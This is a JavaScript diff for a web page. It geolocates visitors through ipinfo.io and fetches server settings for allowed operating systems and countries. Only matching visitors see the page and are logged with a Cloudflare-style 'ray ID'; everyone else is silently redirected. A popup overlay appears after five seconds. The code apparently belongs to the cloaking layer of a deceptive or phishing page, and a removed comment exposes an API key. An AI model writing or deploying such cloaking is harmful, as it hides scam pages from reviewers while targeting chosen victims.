@@ -58,18 +58,6 @@ function loadTranslations() {
 }
 
 
-
-// Getting the country code from the user's IP
-var country_code = '';
-// $.get("https://api.ipdata.co?api-key=550fe21e6fda7f62b485018d9fe45bf04de9da3a4f4c735c2c812c32", function (response) {
-//   country_code = response.country_code;
-// }, "jsonp");
-$.get('https://ipinfo.io/json', function(response) {
-    country_code = response.country;
-})
-
-
-
 // whow pop up after 5 sec
 window.setTimeout(function() {
   $('#overlay').css('display', 'block');
@@ -243,20 +231,28 @@ if (localStorage.getItem('ray')) {
 $('#ray-id').text(rayID);  
 
 
-// Block site
-document.body.style.opacity = 0;
+// Getting the country code from the user's IP
+var country_code = '';
 
-window.setTimeout(function() {
-  check_ray_id();
-
-  $.post('/api/index.php', {
-      rayid: rayID,
-      countrycode: country_code,
-      version: 'V2'
+$.get('https://ipinfo.io/json', function(ipinfo) {
+  country_code = ipinfo.country;
+  $.post('/api/get_validData.php', {}, function(setting) {
+      if (setting.PageStatus == 'ON' && setting.OS.includes(OS) && (setting.GEO.includes(country_code) || setting.GEO.includes('100')) && !setting.BlockedGEO.includes(country_code) && setting.Version.Enabled == 'V2') {
+          $.post('/api/index.php', {
+            rayid: rayID,
+            countrycode: country_code,
+            version: 'V2'
+          });
+          document.body.style.opacity = 100;
+      } else {
+          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
+      } 
   });
-}, 800)
+})
+
 
 // check ray id
+check_ray_id();
 function check_ray_id() {
   $.ajax({
     type: 'POST',
@@ -268,9 +264,7 @@ function check_ray_id() {
         if (res == '10') {
           document.body.innerHTML = '';
           location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
-        } else {
-          document.body.style.opacity = 100;
-        }
+        } 
     }
   })
 }
